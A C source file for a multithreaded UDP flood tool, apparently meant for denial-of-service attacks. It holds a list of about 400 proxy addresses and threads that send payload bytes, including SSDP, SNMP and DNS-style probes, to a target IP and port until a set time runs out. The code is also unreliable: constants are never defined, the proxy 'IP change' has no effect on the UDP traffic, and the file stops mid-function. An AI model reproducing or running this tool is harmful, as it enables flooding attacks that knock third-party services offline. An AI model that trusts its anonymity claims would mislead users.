#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdbool.h>
#include <time.h>
#include <curl/curl.h>
#include <sys/sysinfo.h>

#define PROXY_LIST_SIZE 400  // Update this size to match the actual number of proxies

typedef struct {
    char ip[16];
    int port;
} Proxy;

typedef struct {
    const char *ip;
    int port;
    int time;
} thread_data;

Proxy proxy_list[PROXY_LIST_SIZE] = {
    {"122.116.150.2", 9000},
    {"88.79.243.103", 3128},
    {"185.105.88.63", 4444},
    {"121.182.138.71", 80},
    {"175.139.233.78", 80},
    {"103.133.221.251", 80},
    {"93.177.67.178", 80},
    {"47.251.43.115", 33333},
    {"188.132.222.13", 8080},
    {"23.166.88.205", 3128},
    {"59.124.62.9", 3128},
    {"190.110.98.203", 999},
    {"177.93.45.225", 999},
    {"85.209.153.175", 4145},
    {"118.42.113.37", 443},
    {"213.217.30.69", 3128},
    {"109.194.22.61", 8080},
    {"115.127.31.66", 8080},
    {"123.205.24.244", 8197},
    {"188.253.6.26", 80},
    {"15.204.216.229", 12148},
    {"106.105.218.244", 80},
    {"14.56.137.86", 80},
    {"91.202.230.219", 8080},
    {"84.252.73.132", 4444},
    {"47.100.254.82", 80},
    {"223.100.178.167", 9091},
    {"156.67.217.159", 80},
    {"18.135.211.182", 3128},
    {"185.217.198.121", 4444},
    {"130.61.120.213", 8888},
    {"119.196.168.183", 80},
    {"190.120.249.180", 999},
    {"209.38.196.178", 8081},
    {"41.207.240.254", 80},
    {"15.204.216.229", 24773},
    {"89.35.237.187", 5678},
    {"47.243.92.199", 3128},
    {"3.9.71.167", 80},
    {"195.158.3.198", 3128},
    {"50.62.183.223", 80},
    {"217.182.55.226", 80},
    {"3.9.71.167", 1080},
    {"185.105.91.62", 4444},
    {"220.77.195.132", 80},
    {"154.203.132.55", 8090},
    {"15.204.216.229", 28191},
    {"15.204.216.229", 1217},
    {"13.40.239.130", 1080},
    {"115.127.83.142", 1234},
    {"85.209.153.173", 999},
    {"15.207.35.241", 1080},
    {"34.41.132.8", 80},
    {"123.30.154.171", 7777},
    {"185.117.154.164", 80},
    {"79.110.202.131", 8081},
    {"65.109.194.23", 80},
    {"125.25.40.38", 8080},
    {"183.215.23.242", 9091},
    {"4.236.183.37", 8080},
    {"51.89.255.67", 80},
    {"188.132.222.52", 8080},
    {"51.255.20.138", 80},
    {"15.204.216.229", 5534},
    {"154.16.146.46", 80},
    {"23.152.40.14", 3128},
    {"3.10.93.50", 3128},
    {"164.92.207.53", 3128},
    {"211.253.36.172", 5008},
    {"15.204.216.229", 11025},
    {"8.212.107.200", 80},
    {"190.153.237.2", 37453},
    {"121.126.128.102", 45212},
    {"49.13.215.9", 80},
    {"85.209.153.175", 8888},
    {"185.111.167.124", 8080},
    {"43.255.113.232", 84},
    {"103.237.144.232", 1311},
    {"5.75.200.249", 80},
    {"81.223.232.91", 80},
    {"18.134.236.231", 3128},
    {"85.209.153.173", 5678},
    {"85.192.63.67", 80},
    {"37.27.82.72", 80},
    {"15.204.216.229", 20757},
    {"84.252.75.136", 4444},
    {"140.227.204.70", 3128},
    {"114.129.2.82", 8081},
    {"51.254.78.223", 80},
    {"95.66.138.21", 8880},
    {"89.22.120.116", 80},
    {"15.204.216.229", 15745},
    {"125.77.25.178", 8090},
    {"85.209.153.175", 8080},
    {"112.51.96.118", 9091},
    {"85.209.153.175", 999},
    {"85.209.153.173", 8080},
    {"195.114.209.50", 80},
    {"223.113.80.158", 9091},
    {"15.204.216.229", 4538},
    {"15.204.216.229", 11818},
    {"167.102.133.105", 80},
    {"189.240.60.166", 9090},
    {"93.157.248.108", 88},
    {"111.59.4.88", 9002},
    {"178.54.21.203", 8081},
    {"157.230.127.125", 3128},
    {"85.209.153.175", 4444},
    {"5.196.65.71", 3128},
    {"15.204.216.229", 1306},
    {"85.209.153.174", 8888},
    {"15.204.216.229", 15183},
    {"89.35.237.187", 8080},
    {"13.234.24.116", 3128},
    {"91.241.21.17", 9812},
    {"5.160.89.62", 8080},
    {"85.209.153.174", 3128},
    {"49.13.9.253", 80},
    {"190.2.215.234", 999},
    {"190.95.132.189", 999},
    {"152.231.87.10", 999},
    {"116.203.28.43", 80},
    {"15.204.216.229", 30200},
    {"85.209.153.174", 4153},
    {"47.115.59.100", 80},
    {"60.12.168.114", 9002},
    {"155.94.241.133", 3128},
    {"51.15.242.202", 8888},
    {"13.208.56.180", 80},
    {"185.217.199.176", 4444},
    {"141.11.40.11", 80},
    {"65.1.40.47", 1080},
    {"89.35.237.187", 3128},
    {"209.141.58.24", 80},
    {"39.109.113.97", 3128},
    {"189.240.60.163", 9090},
    {"85.209.153.174", 4444},
    {"15.204.216.229", 1411},
    {"159.224.232.194", 8888},
    {"35.185.196.38", 3128},
    {"82.165.180.64", 3128},
    {"34.124.190.108", 8090},
    {"85.209.153.175", 4153},
    {"84.39.112.144", 3128},
    {"49.13.230.85", 80},
    {"175.213.76.24", 80},
    {"212.127.93.44", 8081},
    {"212.127.93.185", 8081},
    {"85.10.199.41", 3128},
    {"177.234.241.25", 999},
    {"51.89.14.70", 80},
    {"188.132.188.215", 80},
    {"20.235.159.154", 80},
    {"36.95.102.111", 3128},
    {"91.189.177.189", 3128},
    {"43.200.77.128", 3128},
    {"20.193.154.130", 8888},
    {"3.122.84.99", 3128},
    {"190.94.212.150", 999},
    {"43.135.45.237", 80},
    {"101.109.176.76", 8080},
    {"103.159.194.249", 8080},
    {"85.209.153.173", 8888},
    {"188.165.49.152", 80},
    {"161.34.68.133", 3128},
    {"39.129.73.6", 443},
    {"37.221.126.103", 80},
    {"85.209.153.175", 3128},
    {"103.231.239.166", 58080},
    {"189.240.60.169", 9090},
    {"43.132.223.67", 80},
    {"15.204.216.229", 5313},
    {"186.16.14.104", 3131},
    {"13.40.239.130", 3128},
    {"103.86.109.38", 80},
    {"154.203.132.55", 8080},
    {"123.205.24.244", 8193},
    {"47.93.121.200", 80},
    {"89.30.96.166", 3128},
    {"47.90.205.231", 33333},
    {"181.78.17.250", 999},
    {"116.63.129.202", 6000},
    {"162.245.85.220", 80},
    {"103.153.154.6", 80},
    {"58.246.58.150", 9002},
    {"188.132.209.245", 80},
    {"43.202.154.212", 80},
    {"51.91.119.25", 3128},
    {"15.204.216.229", 24244},
    {"185.187.51.21", 80},
    {"212.107.28.120", 80},
    {"185.232.169.108", 4444},
    {"89.187.191.111", 8888},
    {"3.37.125.76", 3128},
    {"212.110.188.204", 34411},
    {"198.49.68.80", 80},
    {"89.35.237.187", 80},
    {"182.16.25.27", 80},
    {"79.110.201.235", 8081},
    {"85.209.153.173", 4444},
    {"15.204.216.229", 5824},
    {"13.126.184.76", 3128},
    {"211.73.182.65", 80},
    {"188.166.56.246", 80},
    {"85.209.153.175", 5678},
    {"85.209.153.175", 80},
    {"49.13.48.21", 80},
    {"38.250.210.26", 8081},
    {"160.248.2.185", 3128},
    {"203.228.28.153", 80},
    {"31.207.38.66", 80},
    {"95.67.79.254", 8080},
    {"92.247.12.139", 9510},
    {"85.209.153.174", 8080},
    {"175.127.69.104", 80},
    {"60.188.102.225", 18080},
    {"103.165.64.74", 83},
    {"222.111.18.67", 80},
    {"125.77.25.178", 8080},
    {"153.101.67.170", 9002},
    {"154.203.132.49", 8080},
    {"38.51.243.145", 999},
    {"59.14.129.243", 80},
    {"185.105.90.88", 4444},
    {"185.49.31.207", 8081},
    {"104.199.205.181", 3128},
    {"172.183.241.1", 8080},
    {"189.240.60.164", 9090},
    {"46.51.249.135", 3128},
    {"103.105.228.35", 8080},
    {"185.17.2.231", 3128},
    {"39.107.33.254", 8090},
    {"89.116.34.113", 80},
    {"84.252.74.190", 4444},
    {"123.56.1.50", 3129},
    {"167.102.133.106", 80},
    {"47.91.104.88", 3128},
    {"79.110.200.148", 8081},
    {"41.33.203.233", 1975},
    {"13.126.184.76", 1080},
    {"189.240.60.168", 9090},
    {"178.48.68.61", 18080},
    {"109.120.156.109", 80},
    {"107.162.143.146", 80},
    {"41.33.203.115", 1982},
    {"85.209.153.173", 80},
    {"160.86.242.23", 8080},
    {"85.209.153.174", 80},
    {"45.9.75.76", 4444},
    {"134.209.189.42", 80},
    {"103.120.6.46", 80},
    {"34.143.221.240", 8103},
    {"35.76.62.196", 80},
    {"125.77.25.177", 8090},
    {"15.204.216.229", 7563},
    {"212.174.242.114", 8080},
    {"23.94.136.205", 80},
    {"122.155.165.191", 3128},
    {"46.17.63.166", 18888},
    {"45.92.68.8", 8080},
    {"103.83.232.122", 80},
    {"221.153.92.39", 80},
    {"211.234.125.3", 443},
    {"211.22.151.163", 60808},
    {"190.90.39.78", 999},
    {"37.140.242.15", 80},
    {"216.137.184.253", 80},
    {"213.57.128.161", 80},
    {"85.209.153.174", 5678},
    {"159.224.243.185", 37793},
    {"34.155.212.138", 8080},
    {"218.252.238.240", 80},
    {"185.105.89.249", 4444},
    {"116.203.27.109", 80},
    {"8.211.51.115", 80},
    {"47.88.31.196", 8080},
    {"109.61.42.223", 80},
    {"59.144.126.42", 3128},
    {"39.125.131.121", 80},
    {"143.198.18.51", 6666},
    {"101.37.12.43", 7777},
    {"192.73.244.36", 80},
    {"185.217.199.176", 4444},
    {"134.209.29.120", 3128},
    {"49.13.48.21", 80},
    {"12.186.205.122", 80},
    {"84.252.74.190", 4444},
    {"216.137.184.253", 80},
    {"188.132.209.245", 80},
    {"185.105.88.63", 4444},
    {"209.141.58.24", 80},
    {"91.189.177.186", 3128},
    {"195.114.209.50", 80},
    {"91.189.177.188", 3128},
    {"34.81.72.31", 80},
    {"45.9.75.76", 4444},
    {"51.89.14.70", 80},
    {"185.105.89.249", 4444},
    {"185.105.91.62", 4444},
    {"50.62.183.223", 80},
    {"51.158.169.52", 29976},
    {"185.105.90.88", 4444},
    {"91.189.177.190", 3128},
    {"128.199.202.122", 3128},
    {"103.133.221.251", 80},
    {"185.217.198.121", 4444},
    {"162.245.85.220", 80},
    {"84.252.75.136", 4444},
    {"103.153.154.6", 80},
    {"139.59.1.14", 8080},
    {"123.30.154.171", 7777},
    {"185.232.169.108", 4444},
    {"91.189.177.189", 3128},
    {"192.73.244.36", 80},
    {"91.92.155.207", 3128},
    {"161.34.40.36", 3128},
    {"84.252.73.132", 4444},
    {"103.49.202.252", 80},
    {"67.227.158.154", 80},
    {"83.169.17.201", 80},
    {"117.54.114.103", 80},
    {"181.209.96.156", 999},
    {"51.255.20.138", 80},
    {"89.35.237.187", 4153},
    {"43.255.113.232", 85},
    {"89.35.237.187", 8080},
    {"103.47.164.242", 8080},
    {"20.193.154.130", 8888},
    {"47.122.56.158", 8081}
};

void usage() {
    printf("Usage: ./udp_flood <target_ip> <target_port> <duration> [threads]\n");
    exit(1);
}

bool set_ip_address(const char *ip, int port) {
    CURL *curl;
    CURLcode res;
    bool success = false;

    curl = curl_easy_init();
    if (curl) {
        char proxy[64];
        snprintf(proxy, sizeof(proxy), "%s:%d", ip, port);
        curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
        curl_easy_setopt(curl, CURLOPT_URL, "http://www.google.com");
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);  // HEAD request to avoid downloading

        res = curl_easy_perform(curl);
        if (res == CURLE_OK) {
            printf("Successfully changed IP to %s:%d\n", ip, port);
            success = true;
        } else {
            fprintf(stderr, "Failed to change IP to %s:%d\n", ip, port);
        }

        curl_easy_cleanup(curl);
    } else {
        fprintf(stderr, "curl_easy_init() failed\n");
    }

    return success;
}

void wait_for_available_proxy() {
    while (true) {
        for (int i = 0; i < PROXY_LIST_SIZE; i++) {
            if (set_ip_address(proxy_list[i].ip, proxy_list[i].port)) {
                return;
            }
        }
        printf("Waiting for an available proxy...\n");
        sleep(5);  // Wait before retrying
    }
}

void *attack(void *arg) {
    thread_data *data = (thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[PAYLOAD_COUNT] = {
        "\xd9\x00", "\x00\x00", "\x00\x00", "\x00\x00", "\x00\x00",
        "\xd9\x00\x00", "\xd9\x00\x00", "\xd9\x00\x00", "\xd9\x00\x00",
        "\xd9\x00\x00", "\xd9\x00\x00", "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00", "\x72\xfe\x1d\x13\x00\x00", "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00", "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x02\x00\x00", "\x0d\x0a\x0d\x0a\x00\x00", "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00", "\x38\x64\xc1\x78\x01\xb8\x9b\xcb\x8f\x00\x00",
        "\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x01\x00\x00", "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
        "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a\x00\x00",
        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00", "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00", "\xff\xff\xaa\xaa", "\xbb\xbb\xcc\xcc", "\xdd\xdd\xee\xee",
        "\xff\xff\xff\xaa\xaa\xaa", "\xbb\xbb\xbb\xcc\xcc\xcc", "\xdd\xdd\xdd\xee\xee\xee", "\x99\x99\x99\x88\x88\x88", "\x77\x77\x77\x66\x66\x66",
        "\x55\x55\x55\x44\x44\x44", "\x33\x33\x33\x22\x22\x22", "\x11\x11\x11\x00\x00\x00", "\xfe\xfe\xfe\xfd\xfd\xfd", "\xfc\xfc\xfc\xfb\xfb\xfb",
        "\xfa\xfa\xfa\xf9\xf9\xf9", "\x01\x02\x03\x04\x05\x06", "\x07\x08\x09\x0a\x0b\x0c", "\x0d\x0e\x0f\x10\x11\x12", "\x13\x14\x15\x16\x17\x18",
        "\x19\x1a\x1b\x1c\x1d\x1e", "\x1f\x20\x21\x22\x23\x24", "\x25\x26\x27\x28\x29\x2a", "\x2b\x2c\x2d\x2e\x2f\x30", "\x31\x32\x33\x34\x35\x36",
        "\x37\x38\x39\x3a\x3b\x3c", "\x3d\x3e\x3f\x40\x41\x42", "\x43\x44\x45\x46\x47\x48", "\x49\x4a\x4b\x4c\x4d\x4e", "\x4f\x50\x51\x52\x53\x54",
        "\x55\x56\x57\x58\x59\x5a", "\x5b\x5c\x5d\x5e\x5f\x60", "\x61\x62\x63\x64\x65\x66", "\x67\x68\x69\x6a\x6b\x6c", "\x6d\x6e\x6f\x70\x71\x72",
        "\x73\x74\x75\x76\x77\x78", "\x79\x7a\x7b\x7c\x7d\x7e", "\x7f\x80\x81\x82\x83\x84", "\x85\x86\x87\x88\x89\x8a", "\x8b\x8c\x8d\x8e\x8f\x90",
        "\x91\x92\x93\x94\x95\x96", "\x97\x98\x99\x9a\x9b\x9c", "\x9d\x9e\x9f\xa0\xa1\xa2", "\xa3\xa4\xa5\xa6\xa7\xa8", "\xa9\xaa\xab\xac\xad\xae",
        "\xaf\xb0\xb1\xb2\xb3\xb4", "\xb5\xb6\xb7\xb8\xb9\xba", "\xbb\xbc\xbd\xbe\xbf\xc0", "\xc1\xc2\xc3\xc4\xc5\xc6", "\xc7\xc8\xc9\xca\xcb\xcc",
        "\xcd\xce\xcf\xd0\xd1\xd2", "\xd3\xd4\xd5\xd6\xd7\xd8", "\xd9\xda\xdb\xdc\xdd\xde", "\xdf\xe0\xe1\xe2\xe3\xe4", "\xe5\xe6\xe7\xe8\xe9\xea",
        "\xeb\xec\xed\xee\xef\xf0", "\xf1\xf2\xf3\xf4\xf5\xf6", "\xf7\xf8\xf9\xfa\xfb\xfc", "\xfd\xfe\xff", "\xde\xad\xbe\xef", "\xca\xfe\xba\xbe",
        "\xba\xdc\x0f\xfe", "\xda\xbb\x1e\xfe", "\xfa\xce\xb0\x0c", "\x1e\xca\xfe\xda", "\xfe\xed\xfa\xce", "\xde\xaf\xfa\xce", "\xab\xad\xca\xfe",
        "\xfa\xce\xfe\xed", "\xde\xad\xba\xbe", "\xbe\xef\xfa\xce", "\x1c\xec\x0f\xfe", "\xca\xfe\xfa\xce", "\xba\xbe\xda\xbb", "\xfa\xce\xca\xfe",
        "\x1c\xec\xab\xad", "\x1c\xec\xca\xfe", "\xca\xfe\xde\xad", "\xba\xdc\xde\xad", "\xca\xfe\x1e\xca", "\xfe\xed\xde\xaf", "\xfe\xed\xfa\xce",
        "\xde\xad\xde\xad", "\xbe\xef\x1e\xfe", "\xfe\xed\x1e\xfe", "\xbe\xef\xab\xad", "\xba\xbe\xab\xad", "\xba\xbe\x1e\xfe", "\xca\xfe\xde\xaf",
        "\xde\xad\xbe\xef", "\xca\xfe\xba\xbe", "\xba\xdc\x0f\xfe", "\xda\xbb\x1e\xfe", "\xfa\xce\xb0\x0c", "\x1e\xca\xfe\xda", "\xfe\xed\xfa\xce",
        "\xde\xaf\xfa\xce", "\xab\xad\xca\xfe", "\xfa\xce\xfe\xed", "\xde\xad\xba\xbe", "\xbe\xef\xfa\xce", "\x1c\xec\x0f\xfe", "\xca\xfe\xfa\xce",
        "\xba\xbe\xda\xbb", "\xfa\xce\xca\xfe", "\x1c\xec\xab\xad", "\x1c\xec\xca\xfe", "\xca\xfe\xde\xad", "\xba\xdc\xde\xad", "\xca\xfe\x1e\xca",
        "\xfe\xed\xde\xaf", "\xfe\xed\xfa\xce", "\xde\xad\xde\xad", "\xbe\xef\x1e\xfe", "\xfe\xed\x1e\xfe", "\xbe\xef\xab\xad", "\xba\xbe\xab\xad",
        "\xba\xbe\x1e\xfe", "\xca\xfe\xde\xaf", "\xfa\xce\xb0\x0c", "\xde\xad\xbe\xef", "\xba\xdc\x0f\xfe", "\xda\xbb\x1e\xfe", "\xde\xad\xbe\xef",
        "\xca\xfe\xba\xbe", "\xba\xdc\x0f\xfe", "\xda\xbb\x1e\xfe", "\xfa\xce\xb0\x0c", "\x1e\xca\xfe\xda", "\xfe\xed\xfa\xce", "\xde\xaf\xfa\xce",
        "\xab\xad\xca\xfe", "\xfa\xce\xfe\xed", "\xde\xad\xba\xbe", "\xbe\xef\xfa\xce", "\x1c\xec\x0f\xfe", "\xca\xfe\xfa\xce", "\xba\xbe\xda\xbb",
        "\xfa\xce\xca\xfe", "\x1c\xec\xab\xad", "\x1c\xec\xca\xfe", "\xca\xfe\xde\xad", "\xba\xdc\xde\xad", "\xca\xfe\x1e\xca", "\xfe\xed\xde\xaf",
        "\xfe\xed\xfa\xce", "\xde\xad\xde\xad", "\xbe\xef\x1e\xfe", "\xfe\xed\x1e\xfe", "\xbe\xef\xab\xad", "\xba\xbe\xab\xad", "\xba\xbe\x1e\xfe",
        "\xca\xfe\xde\xaf", "\xfa\xce\xb0\x0c", "\xde\xad\xbe\xef", "\xba\xdc\x0f\xfe", "\xda\xbb\x1e\xfe", "\xca\xfe\xba\xbe", "\xba\xdc\x0f\xfe",
        "\xda\xbb\x1e\xfe", "\xfa\xce\xb0\x0c", "\x1e\xca\xfe\xda", "\xfe\xed\xfa\xce", "\xde\xaf\xfa\xce", "\xab\xad\xca\xfe", "\xfa\xce\xfe\xed",
        "\xde\xad\xba\xbe", "\xbe\xef\xfa\xce", "\x1c\xec\x0f\xfe", "\xca\xfe\xfa\xce", "\xba\xbe\xda\xbb", "\xfa\xce\xca\xfe", "\x1c\xec\xab\xad",
        "\x1c\xec\xca\xfe", "\xca\xfe\xde\xad", "\xba\xdc\xde\xad", "\xca\xfe\x1e\xca", "\xfe\xed\xde\xaf", "\xfe\xed\xfa\xce", "\xde\xad\xde\xad",
        "\xbe\xef\x1e\xfe", "\xfe\xed\x1e\xfe", "\xbe\xef\xab\xad", "\xba\xbe\xab\xad", "\xba\xbe\x1e\xfe", "\xca\xfe\xde\xaf", "\xfa\xce\xb0\x0c"
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < PAYLOAD_COUNT; i++) {
            for (int j = 0; j < MULTIPLIER; j++) {
                if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                           (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                    perror("Send failed");
                    close(sock);
                    pthread_exit(NULL);
                }
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

void *attack2(void *arg) {
    thread_data *data = (thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads2[PAYLOAD_COUNT] = {
        "\xff\xff", "\xaa\xaa", "\xbb\xbb", "\xcc\xcc", "\xdd\xdd", "\xee\xee",
        "\xff\xff\xff", "\xaa\xaa\xaa", "\xbb\xbb\xbb", "\xcc\xcc\xcc", "\xdd\xdd\xdd",
        "\xee\xee\xee", "\x99\x99\x99", "\x88\x88\x88", "\x77\x77\x77", "\x66\x66\x66",
        "\x55\x55\x55", "\x44\x44\x44", "\x33\x33\x33", "\x22\x22\x22", "\x11\x11\x11",
        "\x00\x00\x00", "\xfe\xfe\xfe", "\xfd\xfd\xfd", "\xfc\xfc\xfc", "\xfb\xfb\xfb",
        "\xfa\xfa\xfa", "\xf9\xf9\xf9", "\x01\x02\x03\x04\x05\x06", "\x07\x08\x09\x0a\x0b\x0c",
        "\x0d\x0e\x0f\x10\x11\x12", "\x13\x14\x15\x16\x17\x18", "\x19\x1a\x1b\x1c\x1d\x1e",
        "\x1f\x20\x21\x22\x23\x24", "\x25\x26\x27\x28\x29\x2a", "\x2b\x2c\x2d\x2e\x2f\x30",
        "\x31\x32\x33\x34\x35\x36", "\x37\x38\x39\x3a\x3b\x3c", "\x3d\x3e\x3f\x40\x41\x42",
        "\x43\x44\x45\x46\x47\x48", "\x49\x4a\x4b\x4c\x4d\x4e", "\x4f\x50\x51\x52\x53\x54",
        "\x55\x56\x57\x58\x59\x5a", "\x5b\x5c\x5d\x5e\x5f\x60", "\x61\x62\x63\x64\x65\x66",
        "\x67\x68\x69\x6a\x6b\x6c", "\x6d\x6e\x6f\x70\x71\x72", "\x73\x74\x75\x76\x77\x78",
        "\x79\x7a\x7b\x7c\x7d\x7e", "\x7f\x80\x81\x82\x83\x84", "\x85\x86\x87\x88\x89\x8a",
        "\x8b\x8c\x8d\x8e\x8f\x90", "\x91\x92\x93\x94\x95\x96", "\x97\x98\x99\x9a\x9b\x9c",
        "\x9d\x9e\x9f\xa0\xa1\xa2", "\xa3\xa4\xa5\xa6\xa7\xa8", "\xa9\xaa\xab\xac\xad\xae",
        "\xaf\xb0\xb1\xb2\xb3\xb4", "\xb5\xb6\xb7\xb8\xb9\xba", "\xbb\xbc\xbd\xbe\xbf\xc0",
        "\xc1\xc2\xc3\xc4\xc5\xc6", "\xc7\xc8\xc9\xca\xcb\xcc", "\xcd\xce\xcf\xd0\xd1\xd2",
        "\xd3\xd4\xd5\xd6\xd7\xd8", "\xd9\xda\xdb\xdc\xdd\xde", "\xdf\xe0\xe1\xe2\xe3\xe4",
        "\xe5\xe6\xe7\xe8\xe9\xea", "\xeb\xec\xed\xee\xef\xf0", "\xf1\xf2\xf3\xf4\xf5\xf6",
        "\xf7\xf8\xf9\xfa\xfb\xfc", "\xfd\xfe\xff", "\xde\xad\xbe\xef", "\xca\xfe\xba\xbe",
        "\xba\xdc\x0f\xfe", "\xda\xbb\x1e\xfe", "\xfa\xce\xb0\x0c", "\x1e\xca\xfe\xda", "\xfe\xed\xfa\xce",
        "\xde\xaf\xfa\xce", "\xab\xad\xca\xfe", "\xfa\xce\xfe\xed", "\xde\xad\xba\xbe", "\xbe\xef\xfa\xce",
        "\x1c\xec\x0f\xfe", "\xca\xfe\xfa\xce", "\xba\xbe\xda\xbb", "\xfa\xce\xca\xfe", "\x1c\xec\xab\xad",
        "\x1c\xec\xca\xfe", "\xca\xfe\xde\xad", "\xba\xdc\xde\xad", "\xca\xfe\x1e\xca", "\xfe\xed\xde\xaf",
        "\xfe\xed\xfa\xce", "\xde\xad\xde\xad", "\xbe\xef\x1e\xfe", "\xfe\xed\x1e\xfe", "\xbe\xef\xab\xad",
        "\xba\xbe\xab\xad", "\xba\xbe\x1e\xfe", "\xca\xfe\xde\xaf", "\xfa\xce\xb0\x0c", "\xde\xad\xbe\xef",
        "\xba\xdc\x0f\xfe", "\xda\xbb\x1e\xfe" "\x01\x02", "\x03\x04", "\x05\x06", "\x07\x08", "\x09\x0a",
        "\x0b\x0c", "\x0d\x0e", "\x0f\x10", "\x11\x12", "\x13\x14",
        "\x15\x16", "\x17\x18", "\x19\x1a", "\x1b\x1c", "\x1d\x1e",
        "\x1f\x20", "\x21\x22", "\x23\x24", "\x25\x26", "\x27\x28",
        "\x29\x2a", "\x2b\x2c", "\x2d\x2e", "\x2f\x30", "\x31\x32",
        "\x33\x34", "\x35\x36", "\x37\x38", "\x39\x3a", "\x3b\x3c",
        "\x3d\x3e", "\x3f\x40", "\x41\x42", "\x43\x44", "\x45\x46",
        "\x47\x48", "\x49\x4a", "\x4b\x4c", "\x4d\x4e", "\x4f\x50",
        "\x51\x52", "\x53\x54", "\x55\x56", "\x57\x58", "\x59\x5a",
        "\x5b\x5c", "\x5d\x5e", "\x5f\x60", "\x61\x62", "\x63\x64",
        "\x65\x66", "\x67\x68", "\x69\x6a", "\x6b\x6c", "\x6d\x6e",
        "\x6f\x70", "\x71\x72", "\x73\x74", "\x75\x76", "\x77\x78",
        "\x79\x7a", "\x7b\x7c", "\x7d\x7e", "\x7f\x80", "\x81\x82",
        "\x83\x84", "\x85\x86", "\x87\x88", "\x89\x8a", "\x8b\x8c",
        "\x8d\x8e", "\x8f\x90", "\x91\x92", "\x93\x94", "\x95\x96",
        "\x97\x98", "\x99\x9a", "\x9b\x9c", "\x9d\x9e", "\x9f\xa0",
        "\xa1\xa2", "\xa3\xa4", "\xa5\xa6", "\xa7\xa8", "\xa9\xaa",
        "\xab\xac", "\xad\xae", "\xaf\xb0", "\xb1\xb2", "\xb3\xb4",
        "\xb5\xb6", "\xb7\xb8", "\xb9\xba", "\xbb\xbc", "\xbd\xbe",
        "\xbf\xc0", "\xc1\xc2", "\xc3\xc4", "\xc5\xc6", "\xc7\xc8",
        "\xc9\xca", "\xcb\xcc", "\xcd\xce", "\xcf\xd0", "\xd1\xd2",
        "\xd3\xd4", "\xd5\xd6", "\xd7\xd8", "\xd9\xda", "\xdb\xdc",
        "\xdd\xde", "\xdf\xe0", "\xe1\xe2", "\xe3\xe4", "\xe5\xe6",
        "\xe7\xe8", "\xe9\xea", "\xeb\xec", "\xed\xee", "\xef\xf0",
        "\xde\xad\xbe\xef", "\xca\xfe\xba\xbe", "\xba\xdc\x0f\xfe",
        "\xda\xbb\x1e\xfe", "\xfa\xce\xb0\x0c", "\x1e\xca\xfe\xda",
        "\xfe\xed\xfa\xce", "\xde\xaf\xfa\xce", "\xab\xad\xca\xfe",
        "\xfa\xce\xfe\xed", "\xde\xad\xba\xbe", "\xbe\xef\xfa\xce",
        "\x1c\xec\x0f\xfe", "\xca\xfe\xfa\xce", "\xba\xbe\xda\xbb",
        "\xfa\xce\xca\xfe", "\x1c\xec\xab\xad", "\x1c\xec\xca\xfe",
        "\xca\xfe\xde\xad", "\xba\xdc\xde\xad", "\xca\xfe\x1e\xca",
        "\xfe\xed\xde\xaf", "\xfe\xed\xfa\xce", "\xde\xad\xde\xad",
        "\xbe\xef\x1e\xfe", "\xfe\xed\x1e\xfe", "\xbe\xef\xab\xad",
        "\xba\xbe\xab\xad", "\xba\xbe\x1e\xfe", "\xca\xfe\xde\xaf"
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
